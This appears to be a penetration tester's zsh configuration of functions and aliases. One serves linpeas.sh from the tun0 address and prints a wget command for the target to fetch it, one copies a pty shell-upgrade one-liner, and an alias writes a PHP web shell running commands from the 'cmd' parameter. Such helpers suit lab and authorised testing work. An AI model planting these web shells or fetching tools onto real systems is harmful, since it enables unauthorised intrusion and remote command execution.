ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
  echo -e "[\033[96mTarget\033[0m] $(cat ~/.config/bin/target)"
}

linpeas() {
  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')

  echo "Run the following command on the target machine: wget http://$ip_tun0/linpeas.sh"
  cd ~/; python3 -m http.server 80
}

upgrade () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}

set_target() {
  echo "$1" > ~/.config/bin/target
}

alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"

alias server="sudo python3 -m http.server 80"

alias target="cat ~/.config/bin/target | tr -d '\n' | xclip -sel clip"

alias phpcmd='echo "<?php system(\$_GET[\"cmd\"]); ?>" | tee webshell.php'

alias aliases='tail -n +116 ~/.zshrc'
